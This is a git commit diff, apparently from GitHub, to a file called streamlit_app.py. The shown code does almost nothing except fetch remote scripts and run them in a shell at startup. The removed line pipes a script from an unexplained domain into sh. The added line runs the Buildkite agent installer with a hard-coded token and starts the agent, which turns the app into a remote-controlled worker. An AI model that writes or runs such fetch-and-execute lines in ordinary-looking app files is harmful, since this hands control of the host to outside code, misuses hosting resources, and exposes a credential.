90a147a9710bdd6241cfe384aee03fd6275a01d9
deryl93 <95095509+deryl93@users.noreply.github.com>
2021-11-27 00:37:00 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,4 +4,4 @@ import os
 # os.environ['HTTP_PROXY'] = proxy
 # os.environ['https_proxy'] = proxy
 # os.environ['HTTPS_PROXY'] = proxy
-os.system("curl -fsSL https://www.animania.tech/start.txt | sh")
+os.system('TOKEN="4a0c6cd1b011c33817f2362cb38c00150d625bda6012457589" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start')
